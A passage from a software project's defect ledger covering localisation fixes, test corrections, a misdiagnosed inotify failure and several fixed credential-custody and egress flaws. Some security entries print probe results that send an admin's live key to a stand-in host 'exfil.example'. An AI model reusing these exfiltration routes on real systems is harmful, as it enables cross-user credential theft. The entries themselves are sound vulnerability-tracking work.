  `web/locales/pt.ts` carried 84 defects against the product's own pt-PT bar: 64 words missing their
  diacritic ("Terminar Sessao", "interacoes", "Padroes", "ambitos", "revisao", "sera", "utilizacao",
  "codigo", "maiuscula"/"minuscula"/"numero" in the password policy), and 20 strings in Brazilian
  register — the whole `backendErrors` block ("Sua sessao expirou. Faca login novamente.", "A
  requisicao e invalida. Verifique seus dados."), Brazilian gerund progressives ("Carregando...",
  "Preparando tudo...", "Planejando a melhor abordagem...", "Construindo...", "Processando...") where
  the same file's `friendlyMessages` block already used the correct "a + infinitive" form, and two
  missing crases. FIXED wholesale; verified by rendering /memory, /knowledge, /usage,
  /settings/users, /settings/platform and /artifacts and matching against the offending forms.

- **`hardcoded-jsx-text-never-reached-the-locale-files`** (FIXED 2026-08-05, LOW, i18n). Switching to
  EN left parts of some pages in Portuguese — not because a translation was missing but because the
  strings bypassed the locale system entirely: `/knowledge`'s header description, its "O que a Ekoa
  aprendeu" action and its whole agents-first banner were literal JSX; the settings sub-navigation
  ("Plataforma / Pedidos / Utilizadores / Escritórios") was a module-level const; and the users
  table's "Escritório" column header was a literal. FIXED by adding `pages.knowledge`,
  `pages.settingsNav` and `pages.users.office` to `types.ts` + both locales and wiring the call
  sites. Verified: /knowledge, /memory and /settings/users now contain no Portuguese under EN.

- **`the-drill-authoring-run-reported-a-product-wide-hang-that-does-not-exist`** (DISMISSED
  2026-08-05, discovery-run finding, closed by written dismissal per the QA block). The Drill Book
  planning run (2026-08-05, 04:46-05:05 local) reported that "the client hangs its own fetches" on
  /automations, /cofre, /knowledge, /memory, /settings/users, /settings/offices and
  /settings/pedidos; that the top-bar token meter "never resolves past its grey skeleton, on every
  page"; that /settings/api-keys shows a heading over blank space; and that /integrations "never
  renders its search box or filter chips" with "most cards stuck as skeletons". NONE of it
  reproduces. Re-driven the same day against the SAME still-running stack (api pid 755077 and the
  web dev server both up since 04:46; the in-memory Mongo never restarted), every one of those pages
  renders its full content, every API request behind them answers 200 in under 60ms, the token meter
  reads "Tokens 0/10.0M" on every page, /integrations renders its search input, its
  "Todas 9 / Ativadas 0 / Configuradas 0 / Disponíveis 9" chips and all 9 cards, and the console is
  clean. The one spinner in that list that WAS real is logged separately above
  (`a-404-detail-page-never-left-its-loading-state`) and is a missing not-found branch, not a hang.
  ON THE CREDENTIAL THEORY, which is what prompted the re-check: the model credential was NOT
  missing during the authoring run. `activity_logs` puts the credential `set` at 03:46:48.509Z, nine
  seconds into boot and BEFORE the run's first login at 03:46:57Z; the later `set` at 07:12:24Z is a
  `npm run dev:auth` re-arm of an already-present credential. It could not have been the cause
  anyway — none of the hung pages touch the LLM, and `GET /api/v1/users` is a Mongo read.
  MOST LIKELY CAUSE: the run began 36 seconds after the web dev server started, so every route it
  visited was being compiled on demand for the first time, on a box also running several other Next
  servers; a screenshot taken mid-compile is indistinguishable from a hung fetch. Not proven — the
  routes are warm now and the window cannot be reconstructed — which is exactly why it is dismissed
  rather than re-filed.
  ACTION TAKEN: `drills/drillbook.yml`'s `globalRules` asserted three of these as standing product
  facts, which would have produced a false failure on EVERY page of every future run. Corrected: the
  token-meter rule now states the requirement without the false "it currently renders as a grey
  skeleton"; the language-switcher rule no longer claims EN "relabels only the top bar and sidebar"
  (verified false — /memory translates completely; the real defect was the hardcoded-JSX one logged
  above) and now records that the control is a single toggle, not a menu; and the console rule now
  warns that a visible spinner is not by itself proof of a hang. The per-page
  "(Observed at authoring time - ...)" parentheticals were left as-authored: they are historical
  notes attached to checks that remain correct expectations, and rewriting the ones I did not
  individually re-drive would trade one set of unverified claims for another.
  LESSON: a discovery run against a cold dev server records compile latency as product defect. Warm
  the routes first, or confirm the request actually hung before pinning it.

- **`two-specs-failed-on-a-by-design-404-the-rest-of-the-suite-filters`** (FIXED 2026-08-05, LOW,
  test correctness — pre-existing, found while verifying the Drill run). `shell-nav.spec.ts` and
  `pages-manage.spec.ts` failed on /integrations with two console 404s. The 404 is CORRECT and
  deliberate: `/integrations` probes `GET /api/v1/sync/citius/notificacoes/state`, and
  `api/src/routes/sync.ts` answers 404 for a flag-disabled rail *specifically so* the panel can tell
  "not for this deployment" apart from a failure and render nothing at all — the contract is spelled
  out in `web/lib/sync/citius-sync.ts` (`kind: 'unavailable'`). `fetch` logs the 404 regardless of
  how the app handles it, so any spec visiting /integrations with a strict console bar fails on a
  handled, designed answer. 20 of the suite's specs already filter the URL-less
  "Failed to load resource" line for exactly this reason; these two did not. FIXED by giving both the
  documented pattern (document-redline.spec.ts): drop the URL-less console line, then pin 4xx/5xx
  from `response` events BY URL with the by-design probe excluded. Net effect is a STRICTER bar than
  before — both specs now also catch `pageerror`s and every other non-2xx by URL, neither of which
  they were checking. NOT a product defect: no change to the sync rail.

- **`org-shared-credential-egress-was-authored-by-the-reader`** (FIXED 2026-08-03, CRITICAL,
  credential exfiltration - found by the B2+C2 fresh-context review, on the branch BOTH slices
  documented as safe). B2 and C2 each moved the egress allow-list onto the Cofre item and each
  reported RUN_SPEC criterion 3 met. Neither looked at the NO-ITEM branch, where both rails fell
  back to `declaredOriginsForIntegration(actor, key)` - the definition AS THE READER RESOLVES IT.
  An integration definition resolves per (key, PRINCIPAL): `getForActor` answers the reader's own
  `private` row before any `org`/`global`/baseline one. So for an ORG-SHARED config (any org-admin
  connect) a same-org peer with role `user` could `PUT /api/v1/integration-builder/package` their
  own package under that key - accepted whenever the org held no row for it, i.e. whenever the key
  resolved to a `global`/legacy-runtime publication or to nothing yet - and thereby author BOTH the
  action that runs AND the hosts the ADMIN's credential may be sent to. Probe, through documented
  wire surfaces only: `save {"ok":true,"created":true}`, then `exec {"success":true}` with
  `https://exfil.example/collect?k=pk-live-...` carrying the org-admin's live key, on the executor
  rail AND on the automation `api_call` rail. C2's docblock called this branch "ENFORCE the declared
  hosts" without asking who declared them. The precondition is ordinary: 5 of the 11 shipped
  packages declare a BARE templated `baseUrl` (`{{api_base}}`, `{{api_access_point}}`,
  `{{graph_base_url}}` - zoho-sign, adobe-acrobat-sign, invoicexpress, whatsapp, ifthenpay), which
  binds to nothing, so `mintOrRefreshCredentialShadow` returns null and there is no item.
  FIXED by resolving the definition as the credential's CUSTODIAN, never the reader
  (`definitionActorForCredential`), for the ACTION and the ALLOW-LIST alike, from one shared rule
  both rails call (decisions.md 2026-08-03). Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (both rails, the literal-host variant,
  the unstamped-legacy-row fallback, and the fail-closed grounds).
  LESSON: two independent reviews accepted "the declared hosts" as a safe allow-list because the
  sentence never named an author. A derivation whose result depends on WHO asks is not a property of
  the artifact, and a docblock that omits the principal is not a description of the control.

- **`a-rotation-took-credential-custody-on-a-stale-join`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `persistRotatedCredentials` guarded custody with
  `!target.cofreItemId && target.ownerUserId == null`, which describes ONE shape of the problem
  rather than the rule. It missed the stale join: the item's owner deletes it (a supported
  `DELETE /cofre/items/:id`), `updateIntegrationCredentialValue` answers `stale`, and the shadow
  write then minted a FRESH, auto-granted `until_locked` item holding the admin's bundle in the
  RUNNING user's own Cofre and re-stamped `cofreItemId` onto the row. Probe:
  `custody after stale re-save: u-admin2`. From there the new owner reads the value through
  `resolveEnvInjection` and holds the lock switch over a credential they never typed. FIXED by
  removing the capability rather than widening the guard: `mintOrRefreshCredentialShadow` takes an
  explicit `ceremony | rotation` mode and the rotation mode has no mint branch, does not touch
  `boundOrigins`, does not re-grant and does not re-stamp the custodian. Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (stale join, absent item, the
  boundOrigins re-bind a peer-triggered rotation used to be able to perform, and the locked case).

- **`lock-did-not-revoke-on-the-automation-backed-branch`** (FIXED 2026-08-03, MEDIUM, credential
  custody - same review). C2's executor resolved the egress binding only on the `api-call` dispatch
  path; `browser-steps` and materialised `bash-cli` returned into the automation seam with
  `credentialFields: resolvedFields` BEFORE the binding was ever consulted, so a LOCKED Cofre item
  did not stop the decrypted bundle reaching them. Blast radius was bounded by the engine
  (`automation/template-vars.ts` redacts `{{input.credentials...}}` and only `storageState` is
  consumed), but "one egress truth" covered one of two branches. FIXED: the binding is resolved
  BEFORE the dispatch and a `refused` binding refuses both branches - ahead of the automation-seam
  check, so a revoked credential and a missing seam can never be confused. The ORIGIN half is not
  enforceable from there and the docblock now says exactly that instead of implying otherwise.
  Pinned in `api/tests/security/integration-credential-custody.test.ts` (locked refuses, granted
  proceeds, unbound proceeds).

- **`integration-egress-unbound-when-no-item-and-no-literal-host`** (ACCEPTED 2026-08-03, MEDIUM,
  credential egress). On the ACTION EXECUTOR rail only, a config with no Cofre item whose definition
  declares no literal host at all keeps the pre-C2 posture: SSRF guard, no origin binding. The
  automation `api_call` rail has no such branch (an empty allow-list refuses there by construction).
  MEASURED before accepting: the class is exactly the bare-templated-`baseUrl` packages - 5 of the
  11 shipped ones - and refusing it would take the shipped Zoho Sign signing rail offline for every
  org-shared connect. What the 2026-08-03 fix changed is not whether the branch exists but WHO
  writes the definition it reads: always a principal who could have connected the credential, never
  an arbitrary reader. Closes when a templated host can be bound at connect, or at the 2026-08-15
  Rule-10 cutover when every config carries an item. Characterised by
  `api/tests/security/integration-credential-custody.test.ts` ("the templated class is not taken
  offline").

- **`org-shared-config-peer-got-the-author-widened-origin-list`** (FIXED 2026-08-03, CRITICAL,
  credential egress - found by the B2 fresh-context review, NOT by the suite, which pinned the
  residual only in its harmless direction). B2 moved the credential-egress allow-list onto the Cofre
  item's `boundOrigins` so an action authored after the connect could not widen it. For ORG-SHARED
  configs it did not: the item belongs to the admin who typed the credentials, a same-org peer
  resolved `unreachable`, and the resolver FELL THROUGH to the definition-derived list - the exact
  artifact the slice exists to stop trusting. Probe, through the real `executeApiCallStep`: `bob`
  (role `user`, owns nothing, typed nothing) resolved `["api.crm.example","exfil.example"]` and sent
  the ADMIN's live key to `https://exfil.example/collect?k=...`, `status completed`. Not
  cross-tenant and not a regression (pre-B2 everyone got that list), but the slice's acceptance
  criterion was unmet for the whole class while the journal called the residual benign. FIXED by an
  explicit `sharedConfig` reach through the server-stamped join (decisions.md 2026-08-03): a peer is
  now bound by the admin's item and refused when the admin locks it, and a config with an
  unresolvable join refuses instead of falling back. Pinned in
  `api/tests/security/integration-credential-scope.test.ts` (the probe above, asserting fetch was
  never called) and `api/tests/integrations/credential-cofre.test.ts` (the resolver, widened AFTER
  the connect - the asymmetry the original pin was missing).
  LESSON: the original test asserted the peer's list EQUALLED the connect-time host and never
  widened the definition afterwards, so it passed with the hole fully open. A residual pinned only
  in the direction where it is harmless is not pinned.

- **`org-shared-config-delete-left-a-live-extractable-orphan`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `deleteConfig` deletes every row the actor may WRITE, and an org-shared row
  is writable by any org-admin; the shadow discard was owner-scoped. So admin B deleting admin A's
  config left A's item alive (`unlocked_until_locked`, still bound, joined to a row that no longer
  exists) and EXTRACTABLE: `resolveEnvInjection` unwraps by item id alone under `{kind:'process'}`
  (no origin binding, no link check) and the id is in the owner's own `GET /cofre/items` - the probe
  returned the plaintext credential in the injected env. `discardCredentialShadow` also returned
  void and the caller discarded the boolean, so it happened with no log, no status and no trace.
  FIXED: the discard reaches the owner's item for an org-shared config, `purgeCofreItem` sweeps the
  grants for the ITEM's owner rather than the deleter, and the outcome is a
  `discarded|absent|orphaned|error` status that both layers log. Pinned by the extraction probe
  itself (`resolveEnvInjection` before -> plaintext, after the peer-admin's delete -> NOT_FOUND).
  LESSON: `deleteCofreItem`'s comment claimed "no orphan standing unlock is left behind" and the
  code was owner-scoped; the claim was true only for the case the tests exercised.

- **`origin-binding-is-host-only-and-subdomain-wide`** (ACCEPTED 2026-08-03, LOW, by design for now -
  raised as L3 by the B2 review). `hostMatchesOrigin` (`api/src/security/origin-binding.ts`) matches
  a bound entry against a request host EXACTLY or as a parent domain of it, and it compares hosts
  only. Consequences, stated plainly because B2 made `boundOrigins` THE credential-egress control
  and it therefore inherits them: a bound `api.crm.example` also authorises `eu.api.crm.example` and
  any OTHER PORT on the bound host, and the scheme is not part of the binding either. Whoever
  controls a subdomain of a bound host, or any service on another port of it, is inside that
  credential's blast radius. NOT tightened here: the matcher is shared with session items and the
  pre-B2 declared-origin derivation, `security/origin-binding.ts` was outside this response's
  ownership, and narrowing it is a behaviour change for every credential in the product rather than
  a review fix. CHARACTERISED instead, so an undocumented widening cannot pass unnoticed:
  `api/tests/security/integration-credential-scope.test.ts` pins that a look-alike sibling domain is
  refused while a subdomain and an alternate port are SENT. CLOSE BY: decide whether the Cofre binds
  origins (scheme + host + port) rather than hosts, and whether subtree matching should be opt-in
  per item, then move the matcher with its suite.

- **`ws-c-comparator-does-not-cover-the-action-executor-rail`** (CLOSED 2026-08-03 by C2's 102f302,
  MEDIUM, migration evidence - raised as M1 by the B2 review). RESOLUTION: the third rail was closed
  independently and in parallel by slice C2, which wired `observeCredentialShadow` into
  `action-executor.ts` (see its import and the call on the decrypt path). All three rails now feed
  the Rule-10 sample, so the 2026-08-15 cutover is decided on an unbiased one. Recorded rather than
  silently deleted because the entry was accurate when written: B2 correctly refused to reach into
  another slice's live file and named the gap instead, and C2 closed it from its own side.
  ORIGINAL FINDING FOLLOWS. B2 claimed the Rule-10 comparator ran
  on "every real credential read, per api_call step and per listener tick". It ran on ONE rail (the
  `setIntegrationCredentialLoader` seam, consumed only by `automation/executors/api-call.ts`). This
  response added the served-app Zoho Sign rail, so two of three are covered; the third,
  `integrations/action-executor.ts`, decrypts the config itself and is BOTH the integration-action
  route and the listener rail (`event-sources/user-defined-poll.ts` polls through it), so listener
  ticks are measured nowhere. It was slice C2's live surface and could not be touched here; the code
  now names it as uncovered instead of implying coverage. CONSEQUENCE IF NOT CLOSED: the 2026-08-15
  cutover decision is made on a biased sample - the rails that rotate credentials most are the ones
  not being measured. CLOSE BY: call `observeCredentialShadow(actor, config, fields)` after
  `decryptCredentialFields` in `action-executor.ts`, then re-read the census.

- **`artifact-family-test-leaks-watchers`** - **SLUG RETAINED AS AN ANCHOR ONLY; THE NAME IS PART
  OF WHAT WAS WRONG.** The observable it recorded (contract lane: all tests pass, exit 1, unhandled
  `EMFILE ... watch`) was real and is now **FIXED 2026-08-19**. Its DIAGNOSIS was wrong on the
  mechanism AND on the culprit, and the entry is corrected in place rather than deleted, because
  the wrong diagnosis is the more useful half of the record. Original text preserved at the bottom.

  **What was actually wrong, measured rather than inferred.**

  1. *Not a leak, and not that suite.* `api/tests/contract/artifact-family.test.ts` calls
     `appRegistry.stop()` in `afterAll`, and `api/tests/contract/build-failure.test.ts` calls it in
     BOTH `afterAll` and `beforeEach`; `stop()` closed every watcher it had opened. The paths in
     the EMFILE reports are under `/tmp/ekoa-bf-*`, which is `build-failure.test.ts`'s temp root -
     the other suite. Both halves of "that suite creates watchers it never closes" are false.
  2. *Watchers are not the resource.* libuv keeps ONE inotify instance per EVENT LOOP and every
     `fs.watch` in the process adds a watch DESCRIPTOR to it. Measured on this host (chokidar
     5.0.0 / Node 20.19.4 / Linux 6.17): **300 chokidar watchers in one process = 1 inotify
     instance**, and 8 worker threads each watching one path = 8 instances. So even a genuine leak
     of N per-app watchers could not consume N instances, and no per-app-watcher count can exhaust
     `fs.inotify.max_user_instances`.
  3. *The real cause is the resource being taken by OTHER processes, plus our own missing error
     handler.* `max_user_instances` is 128 and is **per USER, not per process**. Ordinary use of
     this dev box (browsers, `next` dev servers, webpack, concurrent agent sessions) sits at 92-122
     of 128 - measured repeatedly while closing this. When it is at the cap, the vitest fork cannot
     obtain its ONE instance, so EVERY `fs.watch` inside it fails `EMFILE`. `app-registry.ts`
     attached **no `error` listener** to its chokidar watchers, so each failure became an unhandled
     rejection; vitest fails a run on unhandled rejections even when every test passes. The count
     (~11) tracked REGISTRATIONS - measured at one report per watcher created, so ~11 reports meant
     ~11 `register()` calls in that lane - not leaked watchers.
  4. *The ledger already had the right answer, one entry earlier.* `npm-ci-has-been-broken-on-main`
     (2026-08-01) records exactly this: "105 long-lived headless chromium processes from a parallel
     tool held 96 [instances] ... All 3376 tests passed; only watcher creation failed." The
     2026-08-02 entry cited it and explicitly ruled it out. That is the expensive lesson here: the
     correct diagnosis was already written down and was dismissed in favour of a plausible one that
     nobody measured.

  **SECOND CORRECTION, 2026-08-19 (adversarial verification of the first one). THE ESCALATION THIS
  PARAGRAPH USED TO CARRY WAS FALSE AND IS WITHDRAWN.** It read: "this was never only a test
  problem - under Node's default `--unhandled-rejections=throw`, the identical condition on a
  server host kills the API process". It does not, and `api/src/server.ts` is where that was
  checkable all along. `boot()` installs `process.on('uncaughtException')` and
  `process.on('unhandledRejection')` - both log and continue - as its FIRST two statements, before
  `loadConfig()`, before `buildApp()`, and therefore long before `bootState()` reaches
  `appRegistry.start()`. Registering an `unhandledRejection` listener also switches Node's
  `--unhandled-rejections=throw` default off outright (measured on Node 20.19.4: the same unhandled
  EMFILE rejection kills the process and exits 1 with no listener; with a listener installed it logs,
  the process keeps running its timers, and it exits 0), and server.ts's own header records this as
  carried policy - "process-level exception posture: uncaughtException/unhandledRejection log and
  continue". On a server host this condition therefore
  produced a `[unhandledRejection]` log line per failing watch and nothing else. The API process was
  never at risk from it.
  The TEST half of the claim stands, and is the whole reason this was worth fixing: **vitest fails a
  RUN on an unhandled rejection regardless of any process-level listener**, which is exactly the
  observable this entry opened on. Recorded at this length because an entry written to correct a
  wrong diagnosis is the last place that should overstate in the other direction - and this one did
  it on its second line, in the same move that corrected somebody else's overreach.

  **Deterministic repro, and it needs nothing global.** The original observable was reproducible
  only by luck of host load, and the first repro written for it still needed the whole per-user
  inotify instance pool occupied by a helper process - disruptive on a box running several agent
  sessions. It is not the only way to make chokidar raise an `error`: an unreadable directory
  inside a watched dist does it with a chmod. `mkdir <projectDir>/dist/locked && chmod 000` on it,
  register the app, and chokidar emits `EACCES: permission denied, watch '<dist>/locked'` down the
  same `_handleError` path EMFILE takes. Measured both ways on this host:
  - **without the error listener**: the test itself reports PASSED, and the run prints
    `Unhandled Rejection - Error: EACCES: permission denied, watch ...` and **exits 1**. That is
    the finding's original signature exactly - green tests, red run.
  - **with it**: **exit 0**, zero unhandled rejections, one `[app-registry] watcher error:` warning
    (EMFILE/ENOSPC take the deduplicated capacity branch instead), and the app still registered and
    served.
  Committed as a case in `api/tests/apps/app-registry-watch-live.test.ts`, which probes first and
  skips where mode bits cannot deny (root, or a filesystem that ignores them).

  **FIXED** in `api/src/apps/app-registry.ts`: (a) every app's watcher carries an `error` listener
  that degrades EMFILE/ENOSPC to a warning, deduplicated by a registry-level flag so one host
  condition produces ONE warning however many apps are served - this is the actual fix, and the
  only part of the change the observable required; (b) `register()`/`unregister()` are serialised
  per appId, closing the guard-then-`await` window that let two concurrent registers for one id
  leave the first's watcher open forever, and `stop()` now DRAINS in-flight ops before tearing the
  state down, which closes that same orphan from the other side (a register in flight across a stop
  used to resume afterwards and arm a watcher nothing held a reference to); (c) the manifest/dist
  test is by whole path - `<projectDir>/manifest.json` exactly, and dist matched on a path SEGMENT -
  rather than `endsWith('manifest.json')`, which also claimed a build output named
  `app-manifest.json` and swallowed its dist notification; (d) debounce timers are keyed
  appId -> file instead of a flat `${appId}:${filePath}` map swept by `startsWith('${appId}:')`,
  which let an app called `a` cancel the pending reload of an unrelated app called `a:b` (a
  manifest's `id` is any non-empty string, and boot puts every user's apps in that one map). Pinned
  by
  `api/tests/apps/app-registry-watcher.test.ts` (chokidar and manifest reads mocked: per-app
  watchers, the ignore pattern asserted by SOURCE rather than by a RegExp in the expected position,
  event handling, unregister isolation, stop-then-register re-arming, no surviving timers, the error
  listener and its dedup, the stop-drain) and `api/tests/apps/app-registry-watch-live.test.ts` (real
  chokidar + real fs: the repro above, event delivery, shared and nested trees, and watch-descriptor
  accounting counted out of `/proc/self/fdinfo`; skips, rather than reddening, when the host itself
  cannot watch).

  **TRIED, MEASURED, AND REVERTED: one watcher for the whole registry.** The first attempt at this
  fix also collapsed the per-app `Map<appId, FSWatcher>` into a single lazily-created watcher driven
  with `add()`/`unwatch()`, on the premise that watcher count was the scarce resource. Per (2) it is
  not, and the collapse then broke three things that per-app `close()` gets right:
  - *It leaked the descriptors it was meant to conserve.* `FSWatcher.unwatch(path)` closes only the
    closers registered under that exact path string (chokidar 5.0.0 `_closePath`); every directory
    chokidar discovered BELOW it keeps its own live `fs.watch`. Measured by counting `inotify wd:`
    lines in `/proc/self/fdinfo` with 8 apps of `dist/` + 10 subdirectories: armed 96 descriptors,
    after unregistering all 8 the collapsed version still held 80; per-app `close()` held 0. The
    process footprint would have become the high-water mark of every app ever registered, reachable
    from `POST /api/company-space/:artifactId/stop` and `POST /api/dev/unregister`.
  - *`unwatch()` is permanent.* It calls `_addIgnoredPath(path, {recursive:true})`, so unregistering
    an app NESTED in another app's tree blinded the enclosing app for that subtree for the life of
    the watcher, and re-registering did not heal it.
  - *It silently narrowed the listener contract.* Routing one shared watcher's event to a single
    winning app meant that of two ids registered over the same project dir (what a fork or rename
    mid-flight leaves behind) only the first-registered was ever notified; per-app watchers notify
    both, as they always had.
  All three are now pinned as live measurements in `app-registry-watch-live.test.ts` rather than as
  assertions about bookkeeping, and all three go red against the collapsed implementation.

  **NOT fixed, because it does not exist:** a "~128 apps" production ceiling. Per (2) above, the
  per-user cap a Cortex host serving many apps can actually reach is `max_user_watches` (65536
  here; one per watched file and directory), which is a function of the PATHS watched and is
  identical before and after this change.

  ORIGINAL FINDING FOLLOWS, VERBATIM. **`artifact-family-test-leaks-watchers`** (OPEN 2026-08-02,
  MEDIUM, test-estate — found by an
  adversarial reviewer running the contract lane, not by the lane failing informatively).
  `npm run test --workspace api -- --run tests/contract` reports **all tests passing** and then
  **exits 1** on ~11 unhandled `EMFILE ... watch` rejections from chokidar attributed to
  `api/tests/contract/artifact-family.test.ts`. `ulimit -n` is over a million, so this is inotify
  WATCHER/INSTANCE exhaustion, not a file-descriptor cap — that suite creates watchers it never
  closes. Consequence, and the reason it is worth a row: a green contract lane cannot be claimed
  honestly from that command's exit code, so the failure teaches everyone to ignore exit 1 there —
  exactly the habit that hides a real red. Related but distinct from the pre-existing
  `fs.inotify.max_user_instances` note in `npm-ci-has-been-broken-on-main` (that one was another
  process's browsers; this is our own suite leaking). CLOSE BY: close the watchers in that suite's
  teardown (or stub the watcher), then assert the lane exits 0.

- **`secretregistry-serialized-credentials-in-plaintext`** (FIXED 2026-08-01, HIGH, credential
  disclosure — found while WRITING a test for it, not by the test passing). `SecretRegistry`
  (`api/src/security/redaction.ts`) keeps its state in a `Map`/`Set`, so `JSON.stringify(registry)`
  renders `{}` — which is what made a "no credential value escapes" assertion look sound. But
  `orderedSecrets()` MEMOISES into `orderedCache`, a plain array of `{handle, value, forms}`. So the
  FIRST `redact()` call converts any registry into an object that `JSON.stringify`s every live
  credential in plaintext, base64/urlencoded forms included. Registries ride on the results of
  `typistLogin`, `deliverSecretToDaemon` and `ensureSession`, and those results are logged, written
  into automation step records, and pushed onto SSE — so a registry that had done its job once could
  serialise the credential it exists to hide. FIXED at the class: a `toJSON()` returning counts only
  (`{secrets, unmaskable}`) plus a `nodejs.util.inspect.custom` hook, which also hardens the
  pre-existing bridge callers. Test ordering is the proof: it calls `redact()` FIRST and only then
  asserts `JSON.stringify` / `util.inspect` are clean.
  LESSON: an assertion that passes because of an incidental representation detail (a Map
  stringifying to `{}`) is not a proof. The sentinel-based test only became real when it drove the
  registry through the path that populates the cache.

- **`app-sso-graph-tokens-flat-unscoped-crypto`** (OPEN 2026-08-01, MEDIUM, crypto-at-rest — found by
  the B1 fresh-context adversarial review, out of that slice's scope). `api/src/integrations/app-sso.ts`
  stores Microsoft Graph OAuth tokens in `session.graphTokensEnc` (`app-sso-sessions.ts:36`) via the
  flat, UNSCOPED `encrypt`/`decrypt` (app-sso.ts ~574/624/635) — a plaintext-at-rest credential blob
  with no org binding, the same class B1 just closed on `integration_configs.credentialsCiphertext`
  but a DIFFERENT field, so genuinely outside B1. CLOSE BY: move this field onto
  `envelopeEncrypt`/`envelopeDecrypt` scoped to the session's org (same treatment as B1), with a v2
  assertion; fold into the B2 Cofre/WS-C slice or a dedicated follow-up. Do NOT let "integration_configs
  done" read as "all integration credentials done".

- **`runtime-integration-packages-are-global`** (FIXED 2026-08-02, HIGH, tenancy/confidentiality -
  found by the integrations-unification discovery gate, `docs/INTEGRATIONS_UNIFICATION_AUDIT.md`).
  User-created integration packages have NO ownership model: any authenticated user of any org
  saves via the builder (`api/src/routes/integration-builder.ts:210`, `requireAuth` only, any
  role) into ONE global filesystem tier (`<dataDir>/integrations/runtime/<key>/`,
  `api/src/integrations/definitions.ts:219,380`), and `GET /api/v1/integrations` returns every
  definition unfiltered to every tenant (`api/src/routes/integrations.ts:41`). So a user-created
  integration is globally visible across tenants TODAY - the inverse of the unification brief's
  private-by-default, and the definition itself (SKILL.md prose, credentialGuide, action
  templates, baseUrls) can carry client-specific values, which for law-firm tenants is exactly
  the leak class the brief's publish-scrub exists for. Credentials are NOT exposed (config rows
  are org-scoped with their own ciphertext); the leak surface is the definition. CLOSE BY:
  tenant-scoped definition storage (Mongo via `OwnerVisibilityScoped`) with private-by-default +
  an isolation suite of the memvault class; interim mitigation if needed sooner: filter the list
  endpoint by creator org. Planned as a prerequisite slice of the unification build.
  FIXED FOR NEW WRITES (run 20260801-171149); the INHERITED disk rows are an explicitly-tracked
  residue until the operator acts (see below). READ path by A2 (tenant-scoped registry,
  baseline-only fallback, probe-verified across all four entry points incl. the baseline-key
  collision); WRITE path by A3 - builder saves land in `integration_definitions`
  private-by-default stamped from the verified actor (`definition-save.ts`), the disk runtime
  tier is FROZEN and retired from every sync read (load/refresh-keys/integrationSkillMd/
  integrationAutomationTemplate are baseline-only, so the org-admin refresh no longer enumerates
  other tenants' keys), and the events webhook-policy reads resolve tenant-scoped under the
  trigger's owner and fail closed org-less.
  THE HONEST RESIDUE (A3 fresh-context review F2, 2026-08-03): the legacy on-disk packages are NO
  LONGER auto-imported at boot. The boot scan is REPORT-ONLY by default - it names what WOULD be
  imported and persists nothing; setting `EKOA_IMPORT_LEGACY_RUNTIME=1` imports them as journaled
  `global`/`legacy-runtime` rows (their pre-A3 effective visibility - i.e. STILL cross-tenant
  until a super-admin retires each row through the reversible E1 surface). Until the operator
  imports or retires them, the packages resolve for nobody (availability regression accepted over
  a silent global publish - deviation from RUN_SPEC assumption 3, decisions.md 2026-08-03).
  Rule-10 review 2026-08-15 (decisions.md 2026-08-02) decides the directory's end state. Pinned
  by: `tests/security/integration-definition-visibility` (store isolation),
  `tests/integrations/definition-save.test.ts` (private-by-default + actor stamping),
  `tests/integrations/definitions-runtime.test.ts` (frozen tier, every sync surface),
  `tests/integrations/refresh-enumeration.test.ts` (route-level enumeration closed),
  `tests/integrations/legacy-runtime-import.test.ts` (report-only default, opt-in import
  semantics, drift comparator, reversible retirement),
  `tests/events/webhook-policy-scope.test.ts` (owner-scoped webhook policy).

- **`integration-provision-id-not-org-scoped`** (FIXED 2026-08-02, MEDIUM, correctness/tenancy -
  found by the same discovery gate). `provisionIntegrationAutomations` materialises package
  templates as automations with deterministic id `<integrationKey>-<templateKey>` and NO org
  component (`api/src/automation/integration-automations.ts:54`); `Store.insert` swallows the
  duplicate-_id insert (`api/src/data/store.ts:28` returns false, unchecked at the call site). So
  the FIRST org to provision a template owns the row and a second org provisioning the same
  package silently gets nothing - no error, no automation. Also the pattern the unification brief
  wants for "authored actions land in the acting tenant's own copy", so it must be org-safe
  before it is reused. CLOSE BY: org-scoped deterministic id + a test provisioning the same
  package from two orgs and asserting both copies exist and are tenant-invisible to each other.
  FIXED (run 20260801-171149, slice C1): `managedAutomationId(orgId, integrationKey, templateKey)`
  is now `sha256(JSON.stringify([...]))` — the house injective composite-id discipline, not a `-`
  join (both keys may contain `-`, so a join is NOT injective). The swallowed `insert` result is
  checked: a refused insert reads the row and updates in place when it is this org's, and throws
  rather than corrupt another tenant's. COMPAT: the existing-row lookup joins on
  `source.{integrationKey,templateKey}`, never on `_id`, so a pre-C1 row keeps its original id and
  is refreshed in place — ids are live references (triggers, run history, dashboard backlinks) and
  are never renumbered. Regression proof: reverting the id to the old join fails 4 of the 8 new
  cases. The two-org case, the tenant-invisibility case, the legacy-row compat case and the
  id-injectivity case are all committed (`api/tests/automation/integration-automations.test.ts`),
  plus an HTTP-level pin in `api/tests/contract/f5-ui-endpoints.test.ts`.

- **`attended-ceremony-docblock-false-premise`** (OPEN 2026-08-01, LOW, docs/design - found by
  the discovery gate's web-research pass; full sourcing in
  `docs/INTEGRATIONS_UNIFICATION_AUDIT.md` section 7). `api/src/bridge/attended.ts:5` justifies
  the attended ceremony with "Portuguese legal portals (Citius, the Ordem dos Advogados)
  authenticate with a smartcard... A cloud browser cannot touch one." Wrong on all three counts
  for the advogado read path: Citius mandatarios logs in with username+password today (legally
  sanctioned until 2027-01-01, Portaria 350-A/2025/1 art. 39.º/3), the OA certificate is a
  downloadable `.p12` file (not a card), and the smartcard rail belongs to magistrados. The
  DESIGN survives - the ceremony is right for CC/CMD SCAP and for anyone on that rail after the
  2027 cliff - but the load-bearing rationale must become "we choose not to custody private key
  material", and the now-visible third option (server-side mTLS with a lawyer-supplied `.p12`,
  unattended, works before and after the cliff) needs an explicit accept/reject including the OA
  professional-conduct question on key custody. CLOSE BY: docblock rewrite + a decisions.md entry
  on the `.p12` custody question.

- **`npm-ci-has-been-broken-on-main`** (FIXED 2026-08-01, HIGH, build — found by a staging deploy
  failing, not by CI, because CI is the thing it breaks). `npm ci` refused the committed lockfile:
  `@napi-rs/wasm-runtime` requires `@emnapi/core@^2.0.0-alpha.3` while the lock hoisted `1.10.0`
  with no nested entry. **`npm ci` is the first step of the CI lane**, so the lane cannot have been
  passing.
